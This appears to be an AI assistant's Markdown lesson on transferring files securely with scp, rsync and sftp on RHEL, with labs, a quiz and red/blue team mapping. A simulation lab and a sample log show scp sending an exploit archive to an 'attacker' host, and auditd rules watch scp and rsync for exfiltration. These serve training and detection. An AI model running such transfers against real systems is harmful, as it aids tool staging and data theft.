Excellent, Shahid.
Here is the **Master Grade Edition Markdown Documentation** for:

# 🌐 **Lesson: Transfer Files Between Systems Securely**

*Module 13 – Archive and Transfer Files*
*Cybersecurity Documentation Protocol Ultra v5.0 – Master Grade Edition*
------------------------------------------------------------------------

## 🔰 Introduction

Transferring files across systems is a routine but **critical** task in Linux administration and cybersecurity operations. Whether pushing backups to a remote server, collecting forensic evidence, or sending payloads during red team engagements — **secure file transfer** is essential.

> 🔒 *Objective*: Learn secure file transfer techniques using `scp`, `rsync`, and `sftp` on RHEL systems, with real-world red/blue team mapping, automation, and detection logic.

---

## 🧠 Core Concepts (Feynman Style + Diagrams)

### 🔐 Why Secure Transfer?

Imagine you're passing a package (file) to a friend (remote server). If done in plaintext (like FTP), anyone can:

* Read it 📖
* Alter it 🧪
* Impersonate the sender 😈

So we wrap it in encryption using **SSH-based protocols** like:

* `scp` – Secure Copy Protocol
* `rsync` (over SSH)
* `sftp` – SSH File Transfer Protocol

---

### 🔁 Comparison Table

| Tool    | Encryption | Resume Support | Speed     | Interactive    | Use Case             |
| ------- | ---------- | -------------- | --------- | -------------- | -------------------- |
| `scp`   | Yes (SSH)  | ❌              | Fast      | No             | Quick one-time copy  |
| `rsync` | Yes (SSH)  | ✅              | Very fast | No             | Incremental backup   |
| `sftp`  | Yes (SSH)  | ✅              | Medium    | Yes (like FTP) | Interactive browsing |

---

## 💻 Commands & Configs (RHEL Verified)

### 🔹 `scp`: Quick and Simple

**Send a file to remote:**

```bash
scp file.txt user@192.168.1.100:/home/user/
```

**Download from remote:**

```bash
scp user@192.168.1.100:/home/user/file.txt .
```

**Send a directory recursively:**

```bash
scp -r my_folder/ user@192.168.1.100:/opt/backup/
```

---

### 🔹 `rsync`: Smarter Transfers

**Push a directory to remote (incremental + compressed):**

```bash
rsync -avz ~/mydata/ user@192.168.1.100:/backup/
```

**Sync a remote folder to local:**

```bash
rsync -avz user@192.168.1.100:/var/www/ ~/mirror_www/
```

---

### 🔹 `sftp`: Interactive File Transfer

**Start session:**

```bash
sftp user@192.168.1.100
```

**Common commands inside SFTP session:**

```sftp
ls           # list remote files
cd /path     # change remote dir
put file     # upload file
get file     # download file
```

---

## 🧪 Labs

### 🟢 Beginner Lab: `scp` to Remote Server

1. Create test file:

   ```bash
   echo "secure transfer test" > ~/demo.txt
   ```
2. Copy it:

   ```bash
   scp ~/demo.txt student@192.168.1.100:/tmp/
   ```
3. Verify on remote machine:

   ```bash
   ls /tmp/demo.txt
   ```

---

### ⚙️ Tactical Lab: `rsync` for Web Backup

1. Backup `/var/www/` to remote server:

   ```bash
   rsync -avz /var/www/ admin@192.168.1.110:/mnt/web_backup/
   ```

2. Automate with cron:

   ```bash
   crontab -e
   0 2 * * * rsync -az /var/www/ admin@192.168.1.110:/mnt/web_backup/
   ```

---

### 🎯 Simulation Lab: Red Team Payload Drop via `scp`

**Red Team Action (MITRE T1105 - Ingress Tool Transfer):**

```bash
scp exploit.tar.gz attacker@192.168.1.222:/var/tmp/
```

**Blue Team Action**: Monitor Auditd + SCP logs.

---

## 🛡 Red/Blue Simulation

### 🔴 Red Team Mapping

| Action                       | MITRE ID  | Command          |
| ---------------------------- | --------- | ---------------- |
| File drop (exploit, toolkit) | T1105     | `scp` to victim  |
| Lateral movement             | T1021.004 | `rsync` over SSH |

### 🔵 Blue Team Detection

* 🔍 **Auditd Rule**:

```bash
-w /usr/bin/scp -p x -k scp-transfer
-w /usr/bin/rsync -p x -k rsync-transfer
```

* 📄 **Syslog Log Sample**:

```plaintext
EXECVE: scp -r exploit.tar.gz attacker@192.168.1.222:/tmp
```

* 🚨 **SIEM Alert**:

  * Rule: Outbound `scp` to unknown IP
  * Rule: Unusual `rsync` transfer

---

## 🧠 Deep Quiz (Certification-Oriented)

1. How is `rsync` more efficient than `scp`?
2. Which protocol allows interactive browsing like FTP?
3. Which MITRE technique maps to transferring tools via `scp`?
4. How would you recursively copy `/etc/` to a remote system using `scp`?
5. What flags would you use to preserve permissions with `rsync`?

---

## 🗂 Summary Table + Checklist

| Task                 | Tool         | Command                          |
| -------------------- | ------------ | -------------------------------- |
| Quick file transfer  | `scp`        | `scp file user@ip:/path/`        |
| Incremental sync     | `rsync`      | `rsync -avz dir/ user@ip:/path/` |
| Interactive transfer | `sftp`       | `sftp user@ip`                   |
| Detect file transfer | Auditd       | Watch `/usr/bin/scp`             |
| Schedule backup      | cron + rsync | `0 2 * * * rsync ...`            |

---

## 📓 Journaling + Confidence

* 🗓️ *Date Practiced*: `_________`
* ✅ *Did you try all tools (`scp`, `rsync`, `sftp`)?* Yes / No
* 🔐 *Which tool do you prefer and why?* `___________________`
* 📘 *What was the hardest part?* `_________________________`
* 🎯 *Confidence (1–5)*: `__`

---

## 🧭 Job & Cert Mapping

| Role        | Skill Applied                        | Certifications |
| ----------- | ------------------------------------ | -------------- |
| SOC Analyst | Detect outbound `scp` exfiltration   | CEH, CompTIA+  |
| Sysadmin    | Schedule secure backups with `rsync` | RHCSA          |
| Pentester   | Upload toolkits/payloads via `scp`   | OSCP           |
| IR Analyst  | Monitor SSH transfer abuse           | GCFA           |

---

## 🧠 Spaced Repetition Plan

* **Day 1**: Try all three tools (`scp`, `rsync`, `sftp`) on two VMs
* **Day 3**: Setup cron + `rsync` for backup
* **Day 7**: Simulate exfiltration & write detection rule
* **Day 30**: Teach peers + write detection SOP for transfers

---

✅ **Completed: Transfer Files Between Systems Securely**

Let me know the **next lesson** in Module 13 you want to work on, and I’ll generate it Master-Grade style.
